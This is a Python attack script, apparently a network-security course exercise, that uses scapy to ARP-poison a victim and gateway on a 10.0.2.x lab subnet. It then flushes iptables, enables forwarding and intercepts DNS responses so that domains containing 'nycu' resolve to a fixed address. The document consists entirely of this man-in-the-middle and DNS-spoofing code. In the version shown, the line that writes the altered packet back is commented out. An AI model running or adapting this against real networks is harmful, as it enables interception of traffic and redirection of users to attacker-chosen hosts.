import scapy.all as sp
from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSQR, DNSRR
import time
import netifaces
import os
from netfilterqueue import NetfilterQueue

def arp_spoof():
    ifaces = netifaces.interfaces()
    #print(interfaces)
    interfaces = [iface for iface in ifaces if iface[:4] == 'enp0']
    #print("enp0: ", enp0)
    
    
    ipv4_info = netifaces.ifaddresses(interfaces[0])[netifaces.AF_INET][0]
    addr, nmask = ipv4_info['addr'], ipv4_info['netmask']
    #print('addr: ', addr)
    #print('nmask: ', nmask)
    cidr = sum([bin(int(x)).count('1') for x in nmask.split('.')])
    
    #print('cidr: ', cidr)
    new_addr = addr + '/' + str(cidr)
    #print('new_addr: ', new_addr)
    #print(ipv4_info)
    
    arp = sp.ARP(pdst=new_addr)
    broadcast = sp.Ether(dst='ff:ff:ff:ff:ff:ff')       
    arp_req_bcast = broadcast / arp
    
    result = sp.srp(arp_req_bcast, timeout=3, verbose=False)[0]
    
    print('Available Devices')
    print('-----------------------------------------')
    print('IP                 MAC                 ')
    print('-----------------------------------------')
    
    arp_table = {}
    
    victim_ip = ''
    gateway_ip = ''
    
    for sent, received in result:
        print('{received_psrc}           {received_hwsrc}'
              .format(received_psrc=received.psrc, received_hwsrc=received.hwsrc))
        
        if received.psrc != '10.0.2.2' and received.psrc != '10.0.2.3':
            arp_table[received.psrc] = received.hwsrc
            
        if received.psrc != '10.0.2.2' and received.psrc != '10.0.2.3' and received.psrc != '10.0.2.1':
            victim_ip = received.psrc
        elif received.psrc == '10.0.2.1':
            gateway_ip = received.psrc
    
    print(arp_table)
    
    for psrc, hwsrc in arp_table.items():
        if psrc != '10.0.2.1' and psrc == victim_ip:
            packet = sp.ARP(op=2, pdst=psrc, hwdst=hwsrc, psrc=gateway_ip)
            sp.send(packet, verbose=False)    
        else:
            packet = sp.ARP(op=2, pdst=psrc, hwdst=hwsrc, psrc=victim_ip)
            sp.send(packet, verbose=False)
            
    #os.system("sysctl -w net.ipv4.ip_forward=1")
    #os.system("iptables -t nat -F")
            

def ParsePacket(packet):
    spoof_ip = "140.113.207.241"
    
    #print("Get Packet")
    ip_datagram = IP(packet.get_payload())
    
    
    '''
    First Check if there is dns record
    '''
        
    if ip_datagram.haslayer(DNSRR):
        
        try:
            query_domain = ip_datagram[DNSQR].qname
            #print(query_domain)
        
            if "nycu" in query_domain.decode():
                print("Get RR")
                #print(query_domain)
            else:
                packet.accept()
                
        except:
            packet.accept()
            
        print("Original DNS packet")
        print(ip_datagram[IP].show())
            
        #print(ip_datagram[IP].summary())
        
        try:
            ip_datagram[DNS].an = DNSRR(rrname=query_domain, rdata=spoof_ip)
            ip_datagram[DNS].ancount = 1
            
            del ip_datagram[IP].len
            del ip_datagram[IP].chksum
            del ip_datagram[UDP].len
            del ip_datagram[UDP].chksum
            
            # tmp = ip_datagram[IP].src
            
            # ip_datagram[IP].ttl -= 1
            # ip_datagram[IP].dst = tmp
            # ip_datagram[IP].qr = 1
                        
        except IndexError:
            # not UDP packet, this can be IPerror/UDPerror packets
            packet.accept()
        
        print(ip_datagram[IP].show())
        
        #packet.set_payload(bytes(ip_datagram))
        print("Finish Modifying")

    #packet.drop()
    packet.accept()
    
def dns_spoof():
    print("Start DNS Spoofing...")
    
    queueNum = 0
    os.system("sysctl -w net.ipv4.ip_forward=1")
    os.system("iptables --flush")
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(queueNum))
    #os.system("iptables -I OUTPUT -j NFQUEUE --queue-num {}".format(queueNum))
    #os.system("iptables -I INPUT -j NFQUEUE --queue-num {}".format(queueNum))
    
    queue = NetfilterQueue()
    
    queue.bind(queueNum, ParsePacket)
    
    try:
        queue.run()
    except KeyboardInterrupt:
        os.system("iptables --flush")


def pharm():
    
    arp_spoof()
    dns_spoof()
    
    
if __name__ == "__main__":
    pharm()

